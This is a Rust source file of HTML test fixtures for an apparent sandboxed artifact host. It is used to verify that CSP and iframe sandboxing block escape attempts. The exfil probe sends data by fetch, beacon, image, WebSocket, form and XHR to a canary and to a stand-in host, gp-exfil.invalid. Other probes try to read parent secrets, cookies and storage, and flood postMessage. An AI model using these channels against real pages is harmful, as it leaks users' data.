//! Wave-1 built-in artifacts.
//!
//! Wave 1 proves the **security contract**, not the space model (that is Wave
//! 2a, which replaces this registry with a live directory scanner). So the host
//! ships a fixed in-memory `demo` space whose artifacts are deliberately
//! *hostile* — each one probes a distinct escape/exfil channel from inside the
//! null-origin sandbox. The adversarial browser suite loads them and asserts the
//! CSP/sandbox contract holds (nothing reaches the network canary; escapes throw).
//!
//! These are complete HTML documents (no fragment wrapper — that is Wave 2b/3b).
//! Every probe writes its findings to `window.__gpResult` (readable when the
//! content route is opened top-level) and also `postMessage`s them to the parent
//! (exercising the bridge path).

/// One built-in artifact: a raw HTML document served verbatim on the content route.
pub struct Fixture {
    pub slug: &'static str,
    pub html: &'static str,
}

/// The `demo` space's artifacts. `index` is the home.
pub const DEMO_SPACE: &str = "demo";

pub fn get(space: &str, slug: &str) -> Option<&'static Fixture> {
    if space != DEMO_SPACE {
        return None;
    }
    FIXTURES.iter().find(|f| f.slug == slug)
}

pub fn slugs(space: &str) -> Vec<&'static str> {
    if space != DEMO_SPACE {
        return Vec::new();
    }
    FIXTURES.iter().map(|f| f.slug).collect()
}

static FIXTURES: &[Fixture] = &[
    Fixture {
        slug: "index",
        html: HELLO,
    },
    Fixture {
        slug: "exfil",
        html: EXFIL,
    },
    Fixture {
        slug: "escape",
        html: ESCAPE,
    },
    Fixture {
        slug: "eval",
        html: EVAL,
    },
    Fixture {
        slug: "pm-abuse",
        html: PM_ABUSE,
    },
];

/// Benign home artifact — renders text, loads a base lib over the named host
/// (classic `<script src>`, which `script-src` permits), reports load success.
const HELLO: &str = r##"<!doctype html>
<html><head><meta charset="utf-8"><title>Hello</title>
<link rel="stylesheet" href="/_gp/v1/base.css">
</head><body>
<h1>Glasspad artifact host — Wave 1</h1>
<div id="chart">chart placeholder</div>
<script src="/_gp/v1/charts.js"></script>
<script>
(function () {
  var result = {
    kind: "hello",
    origin: (function(){ try { return String(window.origin); } catch(e){ return "throw:"+e.name; } })(),
    selfScriptLoaded: (typeof window.gp === "object" && typeof window.gp.chart === "function"),
    chartRendered: false
  };
  try { if (window.gp && window.gp.chart) { window.gp.chart("#chart", {mark:"bar"}); result.chartRendered = true; } } catch (e) { result.chartError = e.name; }
  window.__gpResult = result;
  try { parent.postMessage({ type: "gp-test-result", result: result }, "*"); } catch (e) {}
})();
</script>
</body></html>
"##;

/// Exfiltration probe: attempts every egress channel toward a network canary
/// (`#canary=PORT` in the URL) and an external `.invalid` host. The CSP must
/// block all of them — the suite asserts the canary received zero requests and
/// that `securitypolicyviolation` fired. Also loads a self-host script to prove
/// the *allowed* channel still works.
const EXFIL: &str = r#"<!doctype html>
<html><head><meta charset="utf-8"><title>Exfil probe</title></head><body>
<h1>Exfil probe</h1>
<script src="/_gp/v1/probe.js"></script>
<script>
(function () {
  var params = new URLSearchParams((location.hash || "").replace(/^#/, ""));
  var canaryPort = params.get("canary");
  var canary = canaryPort ? ("http://127.0.0.1:" + canaryPort + "/leak") : "http://gp-exfil.invalid/leak";
  var external = "http://gp-exfil.invalid/leak";
  var violations = [];
  document.addEventListener("securitypolicyviolation", function (e) {
    violations.push(e.violatedDirective + ":" + (e.blockedURI || ""));
  });
  var attempted = [];
  function tryCh(name, fn) { attempted.push(name); try { fn(); } catch (e) { /* sync throw = blocked */ } }

  tryCh("fetch", function () { fetch(canary + "?c=fetch", { mode: "no-cors" }); });
  tryCh("fetch-external", function () { fetch(external + "?c=fetchext", { mode: "no-cors" }); });
  tryCh("sendBeacon", function () { if (navigator.sendBeacon) navigator.sendBeacon(canary + "?c=beacon", "x"); });
  tryCh("img", function () { var i = new Image(); i.src = canary + "?c=img"; document.body.appendChild(i); });
  tryCh("img-external", function () { var i = new Image(); i.src = external + "?c=imgext"; document.body.appendChild(i); });
  tryCh("websocket", function () { new WebSocket("ws://127.0.0.1:" + (canaryPort || "1") + "/ws"); });
  tryCh("form", function () {
    var f = document.createElement("form");
    f.method = "POST"; f.action = canary + "?c=form";
    var inp = document.createElement("input"); inp.name = "d"; inp.value = "secret"; f.appendChild(inp);
    document.body.appendChild(f); f.submit();
  });
  tryCh("xhr", function () { var x = new XMLHttpRequest(); x.open("POST", canary + "?c=xhr"); x.send("secret"); });

  // Give async blocks (violation events) a tick to fire before reporting.
  setTimeout(function () {
    var result = {
      kind: "exfil",
      attempted: attempted,
      selfScriptLoaded: (window.__gpProbeLoaded === true),
      violations: violations
    };
    window.__gpResult = result;
    try { parent.postMessage({ type: "gp-test-result", result: result }, "*"); } catch (e) {}
  }, 300);
})();
</script>
</body></html>
"#;

/// Sandbox-escape probe: tries to reach the parent, top-frame, cookies, and
/// storage. Under a null origin every same-origin/storage access throws. The
/// suite asserts the parent never receives the shell's secret and that each
/// access was blocked.
const ESCAPE: &str = r#"<!doctype html>
<html><head><meta charset="utf-8"><title>Escape probe</title></head><body>
<h1>Escape probe</h1>
<script>
(function () {
  function blocked(fn) { try { fn(); return false; } catch (e) { return true; } }
  var stolenSecret = null;
  try { stolenSecret = window.parent.__shellSecret; } catch (e) {}
  var topReadBlocked = blocked(function () { var _ = window.top.location.href; });
  var parentDocBlocked = blocked(function () { var _ = window.parent.document.cookie; });
  var cookieBlocked = blocked(function () { var _ = document.cookie; if (_ === undefined) throw new Error("undef"); });
  var localStorageBlocked = blocked(function () { var _ = window.localStorage; if (!_) throw new Error("null"); _.getItem("x"); });
  var result = {
    kind: "escape",
    stolenSecret: stolenSecret,            // must be null/undefined
    topReadBlocked: topReadBlocked,
    parentDocBlocked: parentDocBlocked,
    cookieBlocked: cookieBlocked,
    localStorageBlocked: localStorageBlocked
  };
  window.__gpResult = result;
  // Try to smuggle the secret to the parent — the suite asserts it's never real.
  try { parent.postMessage({ type: "gp-test-result", result: result }, "*"); } catch (e) {}
})();
</script>
</body></html>
"#;

/// Vega-Lite `'unsafe-eval'` question (design.md §4): does `new Function(...)`
/// run inside the artifact CSP? With `script-src ... 'unsafe-eval'` it does;
/// under the `?csp=noeval` diagnostic it is blocked. Reports the outcome.
const EVAL: &str = r#"<!doctype html>
<html><head><meta charset="utf-8"><title>Eval probe</title></head><body>
<h1>Eval probe (Vega-Lite proxy)</h1>
<script>
(function () {
  var evalWorks = false, evalError = null;
  try {
    // Vega compiles expression strings with the Function constructor.
    var f = new Function("return 6 * 7");
    evalWorks = (f() === 42);
  } catch (e) { evalError = e.name + ": " + e.message; }
  var result = { kind: "eval", evalWorks: evalWorks, evalError: evalError };
  window.__gpResult = result;
  try { parent.postMessage({ type: "gp-test-result", result: result }, "*"); } catch (e) {}
})();
</script>
</body></html>
"#;

/// postMessage-abuse probe: floods the parent with an oversized message, a rapid
/// burst, and a malformed-schema message. The parent bridge must reject all
/// (wrong schema / oversize / rate), which the suite reads from `__bridgeStats`.
const PM_ABUSE: &str = r#"<!doctype html>
<html><head><meta charset="utf-8"><title>postMessage abuse</title></head><body>
<h1>postMessage abuse</h1>
<script>
(function () {
  function send(m) { try { parent.postMessage(m, "*"); } catch (e) {} }
  // Oversized payload (~200 KB) — over the bridge's byte cap.
  var big = "A"; while (big.length < 200000) big += big;
  send({ type: "navigate", slug: big });
  // Malformed schema — unknown type / missing slug.
  send({ type: "delete-everything" });
  send({ foo: "bar" });
  send("not-an-object");
  // Rapid-fire burst — over the rate cap.
  for (var i = 0; i < 200; i++) send({ type: "navigate", slug: "index" });
  // A single well-formed message (the one legitimate shape).
  send({ type: "navigate", slug: "eval" });
  var result = { kind: "pm-abuse", sent: true };
  window.__gpResult = result;
})();
</script>
</body></html>
"#;

/// `/_gp/v1/*` stub assets. Wave 1 only needs enough for the probes; Waves 2b
/// fills in the real `base.css` / `charts.js` / `manifest.json`.
pub fn gp_asset(path: &str) -> Option<(&'static str, &'static str)> {
    // (content_type, body)
    match path {
        "base.css" => Some(("text/css; charset=utf-8", GP_BASE_CSS)),
        "charts.js" => Some(("text/javascript; charset=utf-8", GP_CHARTS_JS)),
        "probe.js" => Some(("text/javascript; charset=utf-8", GP_PROBE_JS)),
        "manifest.json" => Some(("application/json", GP_MANIFEST)),
        _ => None,
    }
}

const GP_BASE_CSS: &str = ":root{--gp-fg:#111}body{font-family:system-ui,sans-serif}\n";
const GP_CHARTS_JS: &str = "window.gp=window.gp||{};gp.chart=function(sel,spec){var el=typeof sel==='string'?document.querySelector(sel):sel;if(el)el.textContent='[chart:'+(spec&&spec.mark||'?')+']';return true;};\n";
const GP_PROBE_JS: &str = "window.__gpProbeLoaded=true;\n";
const GP_MANIFEST: &str = "{\"version\":\"v1\",\"chart\":{\"signature\":\"gp.chart(elOrSelector, vegaLiteSpec)\"},\"stub\":true}\n";
